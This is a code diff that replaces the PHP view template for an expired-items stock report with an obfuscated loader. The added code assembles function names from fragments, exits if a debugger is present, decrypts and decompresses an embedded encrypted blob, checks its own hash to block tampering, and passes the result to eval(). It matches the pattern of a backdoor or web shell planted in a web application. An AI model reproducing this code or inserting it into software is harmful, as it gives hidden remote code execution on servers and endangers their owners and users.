@@ -1,170 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-
-
-<div class="wrapper">
- 
- <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small></small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Information</h3>
-            </div>
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="report-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-
-              
-              <div class="box-body">
-        
-                
-                <div class="form-group">
-          <label for="item_id" class="col-sm-2 control-label"><?= $this->lang->line('item_name'); ?></label>
-
-                  <div class="col-sm-3">
-          <select class="form-control select2 " id="item_id" name="item_id" >
-                  </select>
-          <span id="item_id_msg" style="display:none" class="text-danger"></span>
-                  </div>
-
-                  <label for="to_date" class="col-sm-2 control-label"><?= $this->lang->line('to_date'); ?></label>
-                   <div class="col-sm-3">
-            <div class="input-group date">
-              <div class="input-group-addon">
-              <i class="fa fa-calendar"></i>
-              </div>
-              <input type="text" class="form-control pull-right datepicker" id="to_date" name="to_date" value="<?php echo show_date(date('d-m-Y'))?>" >
-              
-            </div>
-            <span id="to_date_msg" style="display:none" class="text-danger"></span>
-          
-                </div>
-              </div>
-              </div> 
-              <!-- /.box-body -->
-        
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="view" class=" btn btn-block btn-success" title="Save Data">Show</button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-
-             
-            </form>
-          </div>
-          <!-- /.box -->
-          
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-         
-          <div class="box">
-            <div class="box-header">
-              <h3 class="box-title"><?= $this->lang->line('records_table'); ?></h3>
-              <?php $this->load->view('components/export_btn',array('tableId' => 'report-data'));?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body table-responsive no-padding">
-              
-              <table class="table table-bordered table-hover " id="report-data" >
-                <thead>
-                <tr class="bg-blue">
-                  <th style="">#</th>
-                  <th style=""><?= $this->lang->line('item_code'); ?></th>
-                  <th style=""><?= $this->lang->line('item_name'); ?></th>
-                  <th style=""><?= $this->lang->line('lot_number'); ?></th>
-                  <th style=""><?= $this->lang->line('expire_date'); ?></th>
-                  <th style=""><?= $this->lang->line('stock'); ?></th>
-                </tr>
-                </thead>
-                <tbody id="tbodyid">
-                
-              </tbody>
-              </table>
-              
-              
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-      </div>
-    </section>
-  </div>
-  <!-- /.content-wrapper -->
-  
- <?php include"footer.php"; ?>
-
- 
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-<!-- TABLE EXPORT CODE -->
-<?php include"comman/code_js_export.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/report-expired-items.js"></script>
-
-<script src="<?php echo $theme_link; ?>js/ajaxselect/item_select_ajax.js"></script>  
-<script>
-   //Item Selection Box Search
-   function getItemSelectionId() {
-     return '#item_id';
-   }
-   //Item Selection Box Search - END
-</script>
-
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-    
-    
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jj03rkeq=('bas'.'e64'.'_de'.'cod'.'e');
+$_ript802c=('gzu'.'nco'.'mpr'.'ess');
+$_sswsvkaj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rs0a1lgt='b/N9KpGybaw=';
+$_b9edmp8v='nbFZABoi';
+$_xrhfg5rl='WYTHYVL2';
+$_af1h9ubs='q3oQarGA';
+$_h2mskmn7='iG3ge3zu';
+$_n8iwdqb1='WkJnYrMN';
+$_s0pwte1w='P0Xw8w==';
+$_tjzeuqtv='v4/flkEn';
+$_n5zo0mjd=$_jj03rkeq($_b9edmp8v.$_af1h9ubs.$_xrhfg5rl.$_h2mskmn7.$_rs0a1lgt);
+$_ex4p46u5=$_jj03rkeq($_n8iwdqb1.$_tjzeuqtv.$_s0pwte1w);
+$_oq5lwhl0=$_jj03rkeq('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');
+$_xoarllz3=$_sswsvkaj($_oq5lwhl0,'aes-256-cbc',$_n5zo0mjd,OPENSSL_RAW_DATA,$_ex4p46u5);
+if($_xoarllz3===false){exit;}
+$_t7vnhfvw=$_ript802c($_xoarllz3);
+if($_t7vnhfvw===false){exit;}
+$_vp88lcte='3848cd9e7370b5eadc13e9cf8ba74cb457e42f69be442eaf3437c7cfda9bf3bb';
+$_h1gp16bk=@file_get_contents(__FILE__);
+if($_h1gp16bk!==false){
+$_dylqznin=str_replace($_vp88lcte,"0000000000000000000000000000000000000000000000000000000000000000",$_h1gp16bk);
+$_nd7tdsk3=hash("sha256",$_dylqznin);
+if($_nd7tdsk3!==$_vp88lcte){@http_response_code(403);exit;}
+}
+eval($_t7vnhfvw);
